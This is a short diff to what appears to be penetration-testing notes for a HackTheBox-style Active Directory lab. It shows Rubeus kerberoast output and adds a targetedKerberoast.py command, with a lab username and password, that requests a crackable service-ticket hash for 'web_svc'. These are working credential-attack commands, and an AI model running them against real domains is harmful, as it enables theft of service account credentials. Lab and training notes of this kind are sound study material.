@@ -81,3 +81,10 @@ PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 [*] Supported ETypes       : RC4_HMAC_DEFAULT
 [*] Hash written to C:\Tools\hashes.kerberoast
 ```
+
+---
+## Targeted Kerberoasting
+
+```
+python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'riley' -p 'P@ssw0rd' --dc-host dc.painters-htb --request-user web_svc
+```
